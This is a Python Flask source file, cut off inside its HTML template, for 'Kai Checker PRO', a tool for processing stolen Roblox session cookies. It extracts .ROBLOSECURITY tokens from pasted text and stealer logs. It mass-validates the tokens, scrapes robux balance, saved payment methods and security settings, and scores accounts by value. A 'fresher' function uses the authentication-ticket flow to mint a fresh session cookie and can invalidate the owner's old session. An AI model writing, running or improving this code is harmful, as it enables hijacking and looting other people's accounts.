import os
import time
import logging
import re
import urllib3
import json
import requests
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO

# ===== НАСТРОЙКИ =====
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("temp", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CURRENT_UPLOADED_FILE = None
CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

# ============================================================
# ФУНКЦИИ ИСТОРИИ
# ============================================================

def load_history(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def save_history(filepath, data):
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error saving history: {e}")

def add_to_checker_history(entry):
    history = load_history(CHECKER_HISTORY_FILE)
    history.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'type': entry.get('type', 'single'),
        'total': entry.get('total', 1),
        'valid': entry.get('valid', 0),
        'cookies': entry.get('cookies', [])[:20],
        'download_url': entry.get('download_url', '')
    })
    if len(history) > 50:
        history = history[-50:]
    save_history(CHECKER_HISTORY_FILE, history)

def add_to_fresher_history(entry):
    history = load_history(FRESHER_HISTORY_FILE)
    history.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'mode': entry.get('mode', 'duplicate'),
        'refreshed_count': entry.get('refreshed_count', 0),
        'cookies': entry.get('cookies', [])[:20]
    })
    if len(history) > 50:
        history = history[-50:]
    save_history(FRESHER_HISTORY_FILE, history)

# ============================================================
# ИЗВЛЕЧЕНИЕ КУКИ ИЗ ЛЮБОГО ТЕКСТА
# ============================================================

def extract_cookies_from_text(text: str) -> list:
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    matches = re.findall(pattern, text)
    for match in matches:
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='):
            cookie = cookie[15:]
        if len(cookie) > 50:
            cookies.append(cookie)
    
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    matches2 = re.findall(pattern2, text)
    for match in matches2:
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies:
            cookies.append(cookie)
    
    seen = set()
    unique_cookies = []
    for c in cookies:
        if c not in seen:
            seen.add(c)
            unique_cookies.append(c)
    
    return unique_cookies

# ============================================================
# ЧЕКЕР - ПОЛНАЯ ИНФОРМАЦИЯ
# ============================================================

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'TotalRAP': 0, 'Created': '?', 'Country': '?',
        'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False,
        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': cookie,
        'PurchasedGamepasses': {}, 'CreditCardsCount': 0,
        'IsPremium': False, 'DonationTotal': 0
    }
    try:
        cleaned_cookie = cookie.strip()
        if ".ROBLOSECURITY=" in cleaned_cookie:
            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]

        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json'
        })
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                info['UserID'] = d.get('id')
                info['Username'] = d.get('name')
                info['status'] = '✅'
            else:
                info['status'] = '❌'
                return info
        else:
            info['status'] = '❌'
            return info

        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            sec = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = sec.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = sec.get('IsPhoneSet', False)
            bill = d.get('BillingModel', {})
            info['CreditCardsCount'] = len(bill.get('SavedPaymentMethods', []))

        prem = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if prem and prem.get('isSubscribed'):
            info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            total_donated = 0
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    total_donated += price
                    if price >= 50:
                        name = details.get('name', 'Товар')
                        place = details.get('place', {})
                        place_name = place.get('name', 'Другие игры')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            info['PurchasedGamepasses'] = gamepasses_dict
            info['DonationTotal'] = total_donated
        except:
            pass

        score = 0
        if info['EmailSet']: score += 1
        if info['TwoFactorEnabled']: score += 2
        if info['AccountPinEnabled']: score += 1
        if info['PhoneSet']: score += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if score >= 4 else ('🔐 СРЕДНИЙ' if score >= 2 else '⚠️ НИЗКИЙ')
    except Exception as e:
        logger.error(f"Check error: {e}")
        info['status'] = '❌'
    return info

# ============================================================
# ЧЕКЕР - БЫСТРАЯ МАССОВАЯ ПРОВЕРКА
# ============================================================

def quick_validate_cookie(cookie: str) -> dict:
    result = {
        'status': '❌', 'username': '?', 'user_id': '?', 'robux': 0,
        'created': '?', 'created_timestamp': 0, 'is_premium': False,
        'has_email': False, 'has_2fa': False, 'total_donated': 0,
        'cookie': cookie, 'score': 0
    }
    try:
        cleaned_cookie = cookie.strip()
        if ".ROBLOSECURITY=" in cleaned_cookie:
            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
        
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'})
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cleaned_cookie}, timeout=10, verify=False)
        
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                result['status'] = '✅'
                result['username'] = d.get('name', '?')
                result['user_id'] = d.get('id', '?')
                uid = result['user_id']
                
                try:
                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY': cleaned_cookie}, timeout=5, verify=False)
                    if rb.status_code == 200: result['robux'] = rb.json().get('robux', 0)
                except: pass
                
                try:
                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY': cleaned_cookie}, timeout=5, verify=False)
                    if rd.status_code == 200:
                        created = rd.json().get('created', '')
                        if created:
                            dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
                            result['created'] = dt.strftime('%d.%m.%Y')
                            result['created_timestamp'] = dt.timestamp()
                except: pass
                
                try:
                    prem = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY': cleaned_cookie}, timeout=5, verify=False)
                    if prem.status_code == 200: result['is_premium'] = prem.json().get('isSubscribed', False)
                except: pass
                
                try:
                    settings = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY': cleaned_cookie}, timeout=5, verify=False)
                    if settings.status_code == 200:
                        sec = settings.json().get('MyAccountSecurityModel', {})
                        result['has_email'] = sec.get('IsEmailSet', False)
                        result['has_2fa'] = sec.get('IsTwoStepEnabled', False)
                except: pass
                
                score = 0
                if result['robux'] >= 10000: score += 100
                elif result['robux'] >= 5000: score += 75
                elif result['robux'] >= 1000: score += 50
                elif result['robux'] >= 100: score += 25
                elif result['robux'] > 0: score += 10
                if result['is_premium']: score += 50
                if result['has_email']: score += 15
                if result['has_2fa']: score += 10
                if result['created_timestamp'] > 0:
                    age_days = (datetime.now().timestamp() - result['created_timestamp']) / 86400
                    if age_days > 365*3: score += 30
                    elif age_days > 365: score += 20
                    elif age_days > 180: score += 10
                result['score'] = score
    except: pass
    return result

def mass_check_cookies(cookies_list: list, max_workers: int = 10) -> list:
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(quick_validate_cookie, c): c for c in cookies_list}
        for future in as_completed(futures):
            try: results.append(future.result())
            except:
                results.append({'status':'❌', 'cookie': futures[future], 'score':-1, 'username':'?', 'user_id':'?', 'robux':0, 'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False})
    
    valid_results = [r for r in results if r['status'] == '✅']
    invalid_results = [r for r in results if r['status'] == '❌']
    valid_results.sort(key=lambda x: x['score'], reverse=True)
    return valid_results + invalid_results

# ============================================================
# ФРЕШЕР
# ============================================================
def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
    """
    Фрешер куки на основе рабочего метода из Meow Tools.
    Ключевой заголовок: RBXauthenticationNegotiation: 1
    """
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    
    try:
        cleaned_cookie = cookie.strip()
        if ".ROBLOSECURITY=" in cleaned_cookie:
            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
        
        cookies_dict = {'.ROBLOSECURITY': cleaned_cookie}
        
        # Проверяем валидность
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated',
            cookies=cookies_dict, timeout=10, verify=False)
        
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"
            return result
        
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?')
        result['user_id'] = user_data.get('id', '?')
        
        # Шаг 1: Получаем X-CSRF-TOKEN
        csrf_resp = requests.post('https://auth.roblox.com/v2/logout',
            cookies=cookies_dict,
            headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
            verify=False, timeout=10)
        
        csrf_token = csrf_resp.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"
            return result
        
        # Шаг 2: Получаем authentication ticket
        # ВАЖНО: заголовок RBXauthenticationNegotiation и referer как в Meow Tools!
        ticket_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'RBXauthenticationNegotiation': '1',
            'referer': 'https://www.roblox.com/hewhewhew',
            'X-CSRF-Token': csrf_token,
            'Content-Type': 'application/json'
        }
        
        ticket_resp = requests.post('https://auth.roblox.com/v1/authentication-ticket',
            headers=ticket_headers,
            cookies=cookies_dict,
            json={},
            verify=False, timeout=15)
        
        auth_ticket = ticket_resp.headers.get('rbx-authentication-ticket')
        
        if not auth_ticket:
            result['error'] = "Auth ticket not found"
            return result
        
        # Шаг 3: Обмениваем тикет на НОВУЮ куку
        # ВАЖНО: БЕЗ X-CSRF-TOKEN, только RBXauthenticationNegotiation!
        redeem_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'RBXauthenticationNegotiation': '1',
            'Content-Type': 'application/json'
        }
        
        redeem_resp = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem',
            headers=redeem_headers,
            json={"authenticationTicket": auth_ticket},
            verify=False, timeout=15)
        
        # Ищем НОВУЮ куку в ответе
        new_cookie_value = None
        
        # Проверяем Set-Cookie заголовок
        set_cookie_header = redeem_resp.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie_header:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie_header)
            if match:
                new_cookie_value = match.group(1)
        
        # Проверяем cookies в ответе
        if not new_cookie_value:
            for c in redeem_resp.cookies:
                if c.name == '.ROBLOSECURITY' and c.value:
                    new_cookie_value = c.value
                    break
        
        if not new_cookie_value:
            result['error'] = "New cookie not found in response"
            return result
        
        # Шаг 4: Если kill_old - ломаем старую куку
        if kill_old:
            try:
                break_headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'X-CSRF-Token': csrf_token,
                    'Content-Type': 'application/json',
                    'Set-Cookie': '.ROBLOSECURITY=; Max-Age=0; Path=/;'
                }
                requests.post('https://auth.roblox.com/v2/logout',
                    headers=break_headers,
                    cookies=cookies_dict,
                    verify=False, timeout=10)
            except: pass
        
        # Шаг 5: Проверяем НОВУЮ куку
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': new_cookie_value},
            verify=False, timeout=10)
        
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value
            result['success'] = True
            logger.info(f"✅ НОВАЯ КУКА для {result['username']} (метод Meow Tools)")
        else:
            result['error'] = "New cookie validation failed"
            
    except Exception as e:
        logger.error(f"Refresh error: {e}")
        result['error'] = str(e)
    
    return result
# ============================================================
# ФОРМАТИРОВАНИЕ
# ============================================================

def format_full_report(info):
    if info['status'] != '✅':
        return f"❌ НЕВАЛИДНЫЙ КУК\nCookie: {info['Cookie']}"
    gp = info.get('PurchasedGamepasses', {})
    total_gp = sum(p['price'] for passes in gp.values() for p in passes)
    r = "╔══════════════════════════════╗\n"
    r += f"║ 👤 {info['Username']}\n"
    r += f"║ 🆔 {info['UserID']} | 📅 {info['Created']}\n"
    r += f"║ 🌍 {info['Country']}\n"
    r += "╠══════════════════════════════╣\n"
    r += f"║ 💰 Robux: ⏣ {info['Robux']:,}\n"
    r += f"║ 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"║ ⭐ Premium: {'✅' if info['IsPremium'] else '❌'}\n"
    r += f"║ 🔐 {info['SecurityStatus']}\n"
    r += "╚══════════════════════════════╝\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score', 0)
        if score >= 150: rank = "👑"
        elif score >= 100: rank = "💎"
        elif score >= 60: rank = "⭐"
        elif score >= 30: rank = "🟢"
        else: rank = "🔹"
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        if result.get('has_email'): badges.append("📧")
        badge_str = ' '.join(badges)
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣ {result['robux']:,} | 📅 {result['created']} | Score: {score} {badge_str}"
    else:
        return f"❌ НЕВАЛИД"

# ============================================================
# ИНСТРУМЕНТЫ
# ============================================================

def merge_cookie_files(contents):
    all_cookies = set()
    for content in contents:
        for line in content.split('\n'):
            line = line.strip()
            if len(line) > 20: all_cookies.add(line)
    return '\n'.join(sorted(all_cookies))

def split_cookies_by_count(content, count):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    files = []
    for i in range(0, len(cookies), count):
        files.append('\n'.join(cookies[i:i+count]))
    return files

def split_cookies_by_files(content, num):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    if num <= 0: return []
    per_file = len(cookies) // num
    rem = len(cookies) % num
    files = []; idx = 0
    for i in range(num):
        end = idx + per_file + (1 if i < rem else 0)
        files.append('\n'.join(cookies[idx:end]))
        idx = end
    return files

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    return '\n'.join(list(dict.fromkeys(cookies)))

def clean_cookies(content):
    cookies = []
    for line in content.split('\n'):
        line = line.strip()
        if not line: continue
        if '.ROBLOSECURITY=' in line:
            val = line.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
            cookies.append(f'.ROBLOSECURITY={val}')
        elif len(line) > 50 and not line.startswith('#'):
            cookies.append(line)
    return '\n'.join(cookies)

# ============================================================
# FLASK APP
# ============================================================

app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;min-height:100vh;padding:24px;background:#0b081a;background-image:radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%)}
        .wrapper{max-width:1400px;margin:0 auto;padding:30px;background:rgba(18,10,40,0.95);border:2px solid #6c5ce7;border-radius:32px;box-shadow:0 0 60px rgba(108,92,231,0.25)}
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:#0d0722;border-radius:8px}
        ::-webkit-scrollbar-thumb{background:#a855f7;border-radius:8px}
        .header{display:flex;justify-content:space-between;align-items:center;padding:20px 0 16px;border-bottom:1px solid #2a1a50;margin-bottom:30px}
        .logo{font-size:34px;font-weight:900;font-style:italic;background:linear-gradient(135deg,#c084fc,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px}
        .tab{padding:10px 22px;background:rgba(26,16,64,0.9);border:1px solid #2a1a50;border-radius:40px;color:#9880c0;cursor:pointer;font-size:14px;font-weight:600;transition:all 0.25s;user-select:none}
        .tab:hover{border-color:#a855f7;color:#fff;transform:translateY(-2px)}
        .tab.active{border-color:#c084fc;background:rgba(168,85,247,0.3);color:#c084fc;box-shadow:0 0 20px rgba(168,85,247,0.2)}
        .tab-content{display:none}
        .tab-content.active{display:block;animation:fadeUp 0.3s ease}
        @keyframes fadeUp{0%{opacity:0;transform:translateY(12px)}100%{opacity:1;transform:translateY(0)}}
        .card{background:rgba(18,10,40,0.9);border:1px solid #2a1a50;border-radius:20px;padding:28px 30px;margin-bottom:24px;box-shadow:0 20px 40px rgba(0,0,0,0.6)}
        .card h2{font-size:20px;color:#d4c0ff;margin-bottom:18px;display:flex;align-items:center;gap:10px;font-weight:700}
        .btn{padding:12px 28px;border:none;border-radius:40px;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.25s;display:inline-flex;align-items:center;gap:10px;text-decoration:none;color:#fff}
        .btn-primary{background:linear-gradient(135deg,#a855f7,#d946ef);box-shadow:0 8px 24px rgba(168,85,247,0.25)}
        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(168,85,247,0.4)}
        .btn-success{background:linear-gradient(135deg,#10b981,#059669);box-shadow:0 8px 24px rgba(16,185,129,0.25)}
        .btn-success:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(16,185,129,0.4)}
        .btn-secondary{background:rgba(255,255,255,0.06);border:1px solid #2a1a50;color:#d4c0ff}
        .btn-secondary:hover{background:rgba(255,255,255,0.1)}
        .btn-danger{background:rgba(220,38,38,0.2);border:1px solid rgba(220,38,38,0.3);color:#fca5a5}
        .btn-danger:hover{background:rgba(220,38,38,0.3)}
        .btn-sm{padding:8px 16px;font-size:12px}
        .toggle-group{display:flex;background:#0d0722;border:1px solid #2a1a50;border-radius:16px;padding:4px;gap:4px;margin-bottom:18px}
        .toggle-btn{flex:1;padding:12px 16px;background:transparent;border:none;border-radius:12px;color:#9880c0;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.25s;text-align:center}
        .toggle-btn.active{background:linear-gradient(135deg,rgba(168,85,247,0.3),rgba(217,70,239,0.3));color:#c084fc;border:1px solid rgba(192,132,252,0.4);box-shadow:0 4px 15px rgba(168,85,247,0.2)}
        textarea,.upload-area,input[type="number"]{width:100%;padding:14px 16px;background:#0d0722;border:1px solid #2a1a50;border-radius:14px;color:#fff;font-family:'Inter',monospace;font-size:14px;resize:vertical;transition:0.2s}
        textarea:focus,.upload-area:focus-within,input[type="number"]:focus{border-color:#a855f7;outline:none;box-shadow:0 0 0 3px rgba(168,85,247,0.2)}
        .upload-area{min-height:100px;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;border-style:dashed;gap:6px;text-align:center}
        .result-box{background:#0d0722;border:1px solid #2a1a50;border-radius:16px;padding:18px;margin-top:20px;max-height:500px;overflow-y:auto;font-family:'Inter',monospace;font-size:13px;color:#fff;white-space:pre-wrap;word-break:break-all}
        .progress-bar{margin-top:12px;background:#0d0722;border-radius:40px;height:6px;overflow:hidden;border:1px solid #1a1040}
        .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#a855f7,#ec4899);transition:width 0.3s}
        .footer{text-align:center;padding:30px 0 12px;color:#4a3a6a;font-size:13px;border-top:1px solid #1a1040;margin-top:30px}
        .tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px}
        .tool-card{background:rgba(18,10,40,0.9);border:1px solid #2a1a50;border-radius:20px;padding:24px;transition:all 0.3s;display:flex;flex-direction:column}
        .tool-card:hover{border-color:#6c5ce7;box-shadow:0 8px 32px rgba(108,92,231,0.2)}
        .tool-card h3{font-size:16px;color:#c084fc;margin-bottom:8px;font-weight:700}
        .tool-card .desc{color:#9880c0;font-size:13px;margin-bottom:16px;line-height:1.5}
        .tool-card .upload-area{min-height:70px;margin-bottom:12px}
        .input-row{display:flex;gap:10px;align-items:center;margin-bottom:12px}
        .input-row input{flex:1}
        .input-row span{color:#9880c0;font-size:14px;white-space:nowrap}
        .tool-card .btn{margin-top:auto}
        .tool-card .result-box{max-height:150px;margin-top:12px;font-size:12px}
        .file-list{max-height:150px;overflow-y:auto;margin:10px 0;padding:8px;background:#0d0722;border-radius:10px;border:1px solid #1a1040}
        .file-item{background:rgba(26,16,64,0.6);padding:8px 12px;margin:4px 0;border-radius:8px;font-size:12px;color:#9880c0;border:1px solid #2a1a50}
        .history-section{margin-top:24px;border-top:1px solid #1a1040;padding-top:20px}
        .history-section h3{font-size:16px;color:#d4c0ff;margin-bottom:14px;display:flex;align-items:center;justify-content:space-between}
        .history-item{background:rgba(14,8,30,0.8);border:1px solid #1a1040;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;transition:all 0.2s}
        .history-item:hover{border-color:#a855f7;background:rgba(26,16,64,0.6)}
        .hist-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
        .hist-date{color:#a855f7;font-size:13px;font-weight:600}
        .hist-stats{color:#9880c0;font-size:12px}
        .hist-detail{display:none;margin-top:10px;white-space:pre-wrap;font-size:12px;color:#d4c0ff;max-height:200px;overflow-y:auto}
        .empty-history{text-align:center;padding:30px;color:#4a3a6a;font-size:14px}
        .flex-row{display:flex;flex-wrap:wrap;gap:18px}
        .flex-2{flex:2}
        .flex-1{flex:1}
        .mt-12{margin-top:12px}
        .mt-18{margin-top:18px}
        .gap-12{display:flex;gap:12px;flex-wrap:wrap}
        .gap-8{display:flex;gap:8px}
        .timer{color:#00b894;font-family:'Inter',monospace;font-weight:600;font-size:13px;background:rgba(0,184,148,0.1);padding:4px 10px;border-radius:12px;border:1px solid rgba(0,184,148,0.2)}
        .badge{color:#4a3a6a;font-size:14px}
        .status-info{margin-top:8px;color:#00b894;font-size:13px}
        .checker-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
        @media(max-width:900px){.checker-grid{grid-template-columns:1fr}}
        .extract-info{background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.3);border-radius:12px;padding:10px 14px;margin-top:8px;color:#10b981;font-size:13px}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div style="display:flex;align-items:center;gap:15px;">
            <span class="timer" id="sessionTimer">⏱️ 00:00:00</span>
            <span class="badge">⚡ PRO</span>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Вставьте ОДИН кук для полной проверки</p>
                <textarea id="singleCookie" placeholder="Вставьте кук..." rows="3"></textarea>
                <div class="mt-12"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить</button></div>
                <div class="progress-bar"><div class="progress-fill" id="singleProgress"></div></div>
                <div class="result-box" id="singleResult">Результат здесь...</div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка</h2>
                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Загрузите TXT файл. <b style="color:#10b981;">Куки извлекаются автоматически!</b></p>
                <div class="upload-area" onclick="document.getElementById('massFile').click()" style="min-height:120px;">
                    <p>📁 <strong>Загрузить TXT файл</strong></p>
                    <p style="font-size:12px;color:#9880c0;">Поддерживаются логи и чистые куки</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" class="status-info"></div>
                <div id="extractInfo" class="extract-info" style="display:none;"></div>
                <div class="mt-12"><button class="btn btn-success" onclick="runMassCheck()" style="width:100%;">🚀 Массовая проверка</button></div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                <div class="result-box" id="massResult">Результаты здесь...</div>
            </div>
        </div>
        <div class="card history-section">
            <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h3>
            <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <label style="color:#d4c0ff;font-size:14px;font-weight:600;display:block;margin-bottom:8px;">Режим:</label>
            <div class="toggle-group">
                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <div class="flex-row">
                <div class="flex-2"><textarea id="fresherCookies" placeholder="Вставьте куки для обновления..." rows="6"></textarea></div>
                <div class="flex-1"><div class="upload-area" onclick="document.getElementById('fresherFile').click()"><p>📁 <strong>Загрузить .txt</strong></p></div><input type="file" id="fresherFile" accept=".txt" style="display:none;"></div>
            </div>
            <div class="mt-18 gap-12">
                <button class="btn btn-success" onclick="runFresher()">⚡ Обновить</button>
                <button class="btn btn-secondary" onclick="clearFresherInputs()">🧹 Очистить</button>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
            <div class="result-box" id="fresherResult">Новые куки здесь...</div>
        </div>
        <div class="card history-section">
            <h3>📋 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h3>
            <div id="fresherHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <div class="tool-card"><h3>🔗 Слияние файлов</h3><p class="desc">Объедините несколько .txt файлов. Дубликаты удаляются.</p><div class="upload-area" onclick="document.getElementById('mergeFiles').click()"><p>📁 <strong>Выбрать файлы</strong></p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><div class="file-list" id="mergeFileList"></div><button class="btn btn-primary" onclick="mergeCookies()" style="width:100%;">🔄 Объединить</button><div class="result-box" id="mergeResult">Результат...</div></div>
            <div class="tool-card"><h3>✂️ По количеству</h3><p class="desc">Разделите на части по N куки.</p><div class="upload-area" onclick="document.getElementById('splitCountFile').click()"><p>📁 <strong>Загрузить файл</strong></p></div><input type="file" id="splitCountFile" accept=".txt" style="display:none;"><div class="input-row"><input type="number" id="splitCount" value="100" min="1"><span>шт.</span></div><button class="btn btn-primary" onclick="splitByCount()" style="width:100%;">📦 Разделить</button><div class="result-box" id="splitCountResult">Результат...</div></div>
            <div class="tool-card"><h3>📊 На N файлов</h3><p class="desc">Равномерно распределите на N файлов.</p><div class="upload-area" onclick="document.getElementById('splitFilesFile').click()"><p>📁 <strong>Загрузить файл</strong></p></div><input type="file" id="splitFilesFile" accept=".txt" style="display:none;"><div class="input-row"><input type="number" id="splitFilesCount" value="5" min="1"><span>файлов</span></div><button class="btn btn-primary" onclick="splitByFiles()" style="width:100%;">📂 Разделить</button><div class="result-box" id="splitFilesResult">Результат...</div></div>
